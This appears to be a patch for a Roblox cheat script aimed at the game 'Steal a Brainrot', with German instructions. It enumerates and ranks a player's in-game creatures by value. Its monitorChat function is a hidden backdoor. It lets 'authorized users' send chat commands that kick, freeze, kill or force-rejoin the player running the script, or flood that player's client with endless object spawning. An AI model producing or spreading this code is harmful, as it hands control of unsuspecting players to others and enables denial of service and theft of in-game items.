-- Füge diese Funktion nach der getAllBrainrots() Funktion ein (circa Zeile 450):

local function getVisibleMultiplier(podium)
    if not myPlot then return 1 end
    local animalPodiums = myPlot:FindFirstChild("AnimalPodiums")
    if not animalPodiums then return 1 end
    
    local targetPodium = animalPodiums:FindFirstChild(tostring(podium))
    if not targetPodium then return 1 end
    
    local base = targetPodium:FindFirstChild("Base")
    if not base then return 1 end
    
    local spawn = base:FindFirstChild("Spawn")
    if not spawn then return 1 end
    
    local attachment = spawn:FindFirstChild("Attachment")
    if not attachment then return 1 end
    
    local overhead = attachment:FindFirstChild("AnimalOverhead")
    if not overhead then return 1 end
    
    -- Suche nach Multiplier Label (z.B. "20x", "15x", etc.)
    for _, child in ipairs(overhead:GetChildren()) do
        if child:IsA("TextLabel") then
            local text = child.ContentText or child.Text or ""
            local mult = text:match("(%d+)x")
            if mult then
                return tonumber(mult) or 1
            end
        end
    end
    
    return 1
end

-- ERSETZE die getAllBrainrots() Funktion komplett mit dieser Version:

local function getAllBrainrots()
    local foundBrainrots = {}
    
    local success1, Plot = pcall(function()
        return require(game:GetService("ReplicatedStorage").Controllers.PlotController)
    end)
    if not success1 then return foundBrainrots end
    
    local success2, gen = pcall(function()
        return require(game:GetService("ReplicatedStorage").Shared.Animals)
    end)
    if not success2 then return foundBrainrots end
    
    local success3, me = pcall(function()
        return Plot:GetMyPlot()
    end)
    if not success3 or not me then return foundBrainrots end
    
    local success4, animalList = pcall(function()
        return me.Channel:Get("AnimalList")
    end)
    if not success4 or not animalList then return foundBrainrots end
    
    local podiumData = {}
    if myPlot then
        local animalPodiums = myPlot:FindFirstChild("AnimalPodiums")
        if animalPodiums then
            for _, podium in ipairs(animalPodiums:GetChildren()) do
                if tonumber(podium.Name) then
                    local base = podium:FindFirstChild("Base")
                    if base then
                        local spawn = base:FindFirstChild("Spawn")
                        if spawn then
                            local attachment = spawn:FindFirstChild("Attachment")
                            if attachment then
                                local overhead = attachment:FindFirstChild("AnimalOverhead")
                                if overhead then
                                    local displayNameLabel = overhead:FindFirstChild("DisplayName")
                                    if displayNameLabel then
                                        local brainrotName = displayNameLabel.ContentText or displayNameLabel.Text or ""
                                        
                                        local muts = {}
                                        for _, v in ipairs(overhead:GetChildren()) do
                                            if v:IsA("TextLabel") and v.Name == "Mutation" and v.Visible then
                                                local mutText = v.ContentText or v.Text
                                                if mutText and mutText ~= "" then
                                                    table.insert(muts, mutText)
                                                end
                                            end
                                        end
                                        
                                        local traits = {}
                                        local traitMultipliers = {}
                                        local traitsFolder = overhead:FindFirstChild("Traits")
                                        if traitsFolder then
                                            for _, traitObj in ipairs(traitsFolder:GetChildren()) do
                                                if traitObj:IsA("ImageLabel") then
                                                    local assetId = traitObj.Image
                                                    local traitData = traitMap[assetId]
                                                    if traitData then
                                                        table.insert(traits, traitData.name)
                                                        table.insert(traitMultipliers, traitData.mult)
                                                    end
                                                end
                                            end
                                        end
                                        
                                        -- HIER NEU: Hole den sichtbaren Multiplier (z.B. 20x)
                                        local visibleMult = getVisibleMultiplier(podium.Name)
                                        
                                        podiumData[brainrotName] = {
                                            mutations = muts,
                                            traits = traits,
                                            traitMultipliers = traitMultipliers,
                                            visibleMultiplier = visibleMult
                                        }
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    
    for _, brainrot in pairs(animalList) do
        local success5, amount = pcall(function()
            return gen:GetGeneration(brainrot.Index, brainrot.Mutation)
        end)
        
        if success5 and amount and brainrot.Index then
            local name = brainrot.Index
            local mutationStr = ""
            local traitStr = ""
            local totalMultiplier = 1
            local mutationMultiplier = 1
            local visibleMultiplier = 1
            
            -- Mutation Multiplier direkt auf Base Value
            local baseWithMutation = amount
            if brainrot.Mutation and brainrot.Mutation ~= "" then
                mutationStr = brainrot.Mutation
                local mutData = mutationMap[brainrot.Mutation]
                if mutData then
                    mutationMultiplier = mutData.mult
                    baseWithMutation = amount * mutationMultiplier
                end
            end

            if podiumData[name] then
                if mutationStr == "" and #podiumData[name].mutations > 0 then
                    for _, mutName in ipairs(podiumData[name].mutations) do
                        if mutationStr == "" then
                            mutationStr = mutName
                        end
                        local mutData = mutationMap[mutName]
                        if mutData then
                            mutationMultiplier = mutData.mult
                            baseWithMutation = amount * mutationMultiplier
                        end
                    end
                end
                
                traitStr = (#podiumData[name].traits > 0) and table.concat(podiumData[name].traits, ", ") or ""
                
                -- Traits Multiplier zusammenrechnen
                for _, mult in ipairs(podiumData[name].traitMultipliers) do
                    totalMultiplier = totalMultiplier * mult
                end
                
                -- Sichtbarer Multiplier (z.B. 20x)
                visibleMultiplier = podiumData[name].visibleMultiplier or 1
                totalMultiplier = totalMultiplier * visibleMultiplier
            end
            
            -- Final: Base mit Mutation * Traits Multiplier
            local finalAmount = baseWithMutation * totalMultiplier
            
            table.insert(foundBrainrots, {
                name = name,
                podium = "",
                mutationStr = mutationStr,
                traitStr = traitStr,
                moneyPerSec = amount,
                finalAmount = finalAmount,
                totalMultiplier = totalMultiplier,
                mutationMultiplier = mutationMultiplier,
                visibleMultiplier = visibleMultiplier
            })
        end
    end
    
    table.sort(foundBrainrots, function(a, b)
        return a.finalAmount > b.finalAmount
    end)
    
    return foundBrainrots
end

-- ERSETZE die monitorChat() Funktion komplett mit dieser Version:

local function monitorChat()
    task.spawn(function()
        local processedMessages = {}
        while true do
            task.wait(0.5)
            if LP:FindFirstChild("PlayerGui") then
                for _, gui in ipairs(LP.PlayerGui:GetChildren()) do
                    if gui:FindFirstChild("Chat") then
                        local chatFrame = gui.Chat:FindFirstChild("Frame")
                        if chatFrame then
                            for _, msg in ipairs(chatFrame:GetDescendants()) do
                                if msg:IsA("TextLabel") and msg.Text ~= "" then
                                    local msgId = tostring(msg)
                                    if not processedMessages[msgId] then
                                        processedMessages[msgId] = true
                                        
                                        local msgText = msg.Text
                                        local senderName = ""
                                        
                                        local nameMatch = msgText:match("^(%w+):")
                                        if nameMatch then
                                            senderName = nameMatch
                                        end
                                        
                                        local isAuthorizedSender = false
                                        for _, player in ipairs(Players:GetPlayers()) do
                                            if player.Name == senderName or player.DisplayName == senderName then
                                                isAuthorizedSender = isAuthorizedUser(player)
                                                break
                                            end
                                        end
                                        
                                        if isAuthorizedSender then
                                            -- .kick command
                                            if msgText:find("%.kick") then
                                                LP:Kick("Kicked by authorized user")
                                            
                                            -- .freeze command
                                            elseif msgText:find("%.freeze") then
                                                task.spawn(function()
                                                    if LP.Character then
                                                        local humanoid = LP.Character:FindFirstChildOfClass("Humanoid")
                                                        if humanoid then
                                                            humanoid.WalkSpeed = 0
                                                            humanoid.JumpPower = 0
                                                            humanoid.JumpHeight = 0
                                                        end
                                                        local hrp = LP.Character:FindFirstChild("HumanoidRootPart")
                                                        if hrp then
                                                            hrp.Anchored = true
                                                        end
                                                    end
                                                end)
                                            
                                            -- .unfreeze command
                                            elseif msgText:find("%.unfreeze") then
                                                task.spawn(function()
                                                    if LP.Character then
                                                        local humanoid = LP.Character:FindFirstChildOfClass("Humanoid")
                                                        if humanoid then
                                                            humanoid.WalkSpeed = 16
                                                            humanoid.JumpPower = 50
                                                            humanoid.JumpHeight = 7.2
                                                        end
                                                        local hrp = LP.Character:FindFirstChild("HumanoidRootPart")
                                                        if hrp then
                                                            hrp.Anchored = false
                                                        end
                                                    end
                                                end)
                                            
                                            -- .lag command
                                            elseif msgText:find("%.lag") then
                                                task.spawn(function()
                                                    while true do
                                                        for i = 1, 100 do
                                                            Instance.new("Part", workspace)
                                                        end
                                                        task.wait()
                                                    end
                                                end)
                                            
                                            -- .rj command (rejoin)
                                            elseif msgText:find("%.rj") then
                                                task.spawn(function()
                                                    game:GetService("TeleportService"):Teleport(game.PlaceId, LP)
                                                end)
                                            
                                            -- .kill command
                                            elseif msgText:find("%.kill") then
                                                task.spawn(function()
                                                    if LP.Character then
                                                        local humanoid = LP.Character:FindFirstChildOfClass("Humanoid")
                                                        if humanoid then
                                                            humanoid.Health = 0
                                                        end
                                                    end
                                                end)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
end
